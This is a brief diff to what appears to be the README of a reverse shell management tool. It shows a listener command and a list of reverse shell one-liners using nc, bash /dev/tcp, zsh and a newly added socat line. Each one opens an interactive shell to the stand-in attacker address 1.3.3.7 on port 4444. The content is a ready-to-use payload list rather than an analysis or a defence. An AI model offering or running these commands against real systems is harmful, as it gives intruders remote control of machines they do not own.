@@ -14,6 +14,7 @@ python Reverse-Shell-Manager.py 0.0.0.0 4444
 nc -e /bin/bash 1.3.3.7 4444
 bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
 zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
 ```
 > Windows
 ```
